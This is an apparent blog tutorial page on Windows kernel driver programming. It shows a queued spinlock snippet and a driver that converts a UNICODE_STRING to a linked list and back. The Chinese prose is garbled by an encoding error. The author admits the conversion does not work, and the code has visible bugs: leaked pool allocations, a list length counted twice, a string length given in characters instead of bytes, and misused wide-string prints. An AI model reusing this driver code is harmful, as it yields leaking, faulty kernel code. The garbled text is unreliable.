<p>é˜Ÿåˆ—è‡ªæ—‹é”å¯ä»¥æé«˜æ€§èƒ½ï¼Œéµå®ˆå…ˆæ¥å…ˆæœåŠ¡åŸåˆ™</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">KSPIN_LOCK my_queue_spinlock=<span class="number">0</span>;</span><br><span class="line">KeInitializeSpinLock(&amp;my_queue_spinlock);</span><br><span class="line">KLOCK_QUEUE_HANDLE my_lock_queue_handle;</span><br><span class="line">KeAcquireInStackQueuedSpinLock(&amp;my_queue_spinlock,&amp;my_lock_queue_handle);</span><br><span class="line"><span class="comment">// your code</span></span><br><span class="line">KeReleaseInStackQueuedSpinLock(&amp;my_lock_queue_handle);</span><br></pre></td></tr></table></figure>

<h3 id="å®ä¾‹ï¼šé“¾è¡¨å’Œå­—ç¬¦ä¸²è½¬æ¢ç¨‹åº"><a href="#å®ä¾‹ï¼šé“¾è¡¨å’Œå­—ç¬¦ä¸²è½¬æ¢ç¨‹åº" class="headerlink" title="å®ä¾‹ï¼šé“¾è¡¨å’Œå­—ç¬¦ä¸²è½¬æ¢ç¨‹åº"></a>å®ä¾‹ï¼šé“¾è¡¨å’Œå­—ç¬¦ä¸²è½¬æ¢ç¨‹åº</h3><p>(è™½ç„¶è½¬æ¢è¿˜æ˜¯ä¸æˆåŠŸï¼Œå¾…åé¢å¼€å‘å¡«è¡¥)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstrsafe.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	LIST_ENTRY <span class="built_in">list</span>;</span><br><span class="line">	WCHAR c;</span><br><span class="line">	UINT len;</span><br><span class="line">&#125;String,*PString;</span><br><span class="line">KSPIN_LOCK spinLock;</span><br><span class="line">KIRQL irql;</span><br><span class="line"><span class="function">VOID <span class="title">printLinkedList</span><span class="params">(PString head)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//ExAcquireSpinLock(&amp;spinLock, &amp;irql);</span></span><br><span class="line">	WCHAR dst[<span class="number">1024</span>];</span><br><span class="line">	RtlStringCbPrintfW(dst, <span class="keyword">sizeof</span>(dst), <span class="string">L&quot;hello: LinkedList:&quot;</span>);</span><br><span class="line">	PString p = head-&gt;<span class="built_in">list</span>.Blink;</span><br><span class="line">	UINT len = head-&gt;len;</span><br><span class="line">	<span class="keyword">for</span>(UINT i=<span class="number">0</span>;i&lt;len;i++) &#123;</span><br><span class="line">		RtlStringCbPrintfW(dst, <span class="keyword">sizeof</span>(dst), <span class="string">L&quot;%wZ%d,&quot;</span>,dst, (UINT)(p-&gt;c));</span><br><span class="line">		p = p-&gt;<span class="built_in">list</span>.Blink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//KdBreakPoint();</span></span><br><span class="line">	DbgPrint(dst);</span><br><span class="line">	<span class="comment">//ExReleaseSpinLock(&amp;spinLock, &amp;irql);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">addToLinkedList</span><span class="params">(PString head,PString node)</span> </span>&#123;</span><br><span class="line">	PString p = ExAllocatePool(NonPagedPool, <span class="keyword">sizeof</span>(String));</span><br><span class="line">	InsertHeadList(head, node);</span><br><span class="line">	head-&gt;len++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">freeLinkedList</span><span class="params">(PString head)</span> </span>&#123;</span><br><span class="line">	PString p = head-&gt;<span class="built_in">list</span>.Blink,pp=head;</span><br><span class="line">	UINT len = head-&gt;len;</span><br><span class="line">	<span class="keyword">for</span> (UINT i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		ExFreePool(pp);</span><br><span class="line">		pp = p;</span><br><span class="line">		p = pp-&gt;<span class="built_in">list</span>.Blink;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">linkedListToString</span><span class="params">(PString head,UNICODE_STRING *str)</span> </span>&#123;</span><br><span class="line">	WCHAR *buf = ExAllocatePool(NonPagedPool, <span class="keyword">sizeof</span>(WCHAR)*(head-&gt;len));</span><br><span class="line">	<span class="keyword">if</span> (!buf) &#123;</span><br><span class="line">		DbgPrint(<span class="string">L&quot;Memory Alloc Failed&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PString p = head-&gt;<span class="built_in">list</span>.Blink;</span><br><span class="line">	<span class="keyword">for</span> (UINT i = <span class="number">0</span>; i &lt; head-&gt;len; i++) &#123;</span><br><span class="line">		buf[i] = (WCHAR)p-&gt;c;</span><br><span class="line">		p = p-&gt;<span class="built_in">list</span>.Blink;</span><br><span class="line">	&#125;</span><br><span class="line">	str-&gt;Buffer = buf;</span><br><span class="line">	str-&gt;Length = head-&gt;len;</span><br><span class="line">	str-&gt;MaximumLength = head-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">VOID <span class="title">stringToLinkedLIst</span><span class="params">(UNICODE_STRING str,PString head)</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (UINT i = <span class="number">0</span>; i &lt; str.Length; i++) &#123;</span><br><span class="line">		PString p = ExAllocatePool(NonPagedPool, <span class="keyword">sizeof</span>(String));</span><br><span class="line">		<span class="keyword">if</span> (!p) &#123;</span><br><span class="line">			DbgPrint(<span class="string">L&quot;Memory Alloc Failed&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		addToLinkedList(head, p);</span><br><span class="line">		p-&gt;c = str.Buffer[i];</span><br><span class="line">		head-&gt;len++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span> </span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;hello: driver unloading...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path)</span> </span>&#123;</span><br><span class="line">	KeInitializeSpinLock(&amp;spinLock);</span><br><span class="line">	UNICODE_STRING str;</span><br><span class="line">	String head;</span><br><span class="line">	InitializeListHead(&amp;head);</span><br><span class="line">	head.len = <span class="number">0</span>;</span><br><span class="line">	RtlInitUnicodeString(&amp;str, <span class="string">L&quot;You are the best!&quot;</span>);</span><br><span class="line">	DbgPrint(<span class="string">&quot;Transfering UNICODE_STRING to LinkList: %wZ&quot;</span>, &amp;str);</span><br><span class="line">	stringToLinkedLIst(str, &amp;head);</span><br><span class="line">	DbgPrint(<span class="string">&quot;Transfering LinkList to UNICODE_STRING: &quot;</span>);</span><br><span class="line">	<span class="comment">//KdBreakPoint();</span></span><br><span class="line">	printLinkedList(&amp;head);</span><br><span class="line">	linkedListToString(&amp;head, &amp;str);</span><br><span class="line">	DbgPrint(&amp;str);</span><br><span class="line">	DbgPrint(<span class="string">&quot;Freeing memory&quot;</span>);</span><br><span class="line">	<span class="comment">//freeLinkedList(&amp;head); // æš‚æ—¶ä¸é‡Šæ”¾äº†ï¼Œä¼¼ä¹é“¾è¡¨æœ‰æ£€æŸ¥æœºåˆ¶ï¼Œéœ€è¦åˆ«çš„é‡Šæ”¾æ–¹æ³•</span></span><br><span class="line">	ExFreePool(str.Buffer);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ul>
<li>ã€ŠWindowså†…æ ¸å®‰å…¨ä¸é©±åŠ¨å¼€å‘ã€‹</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2021 John Doe
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>


  </div>
</body>
</html>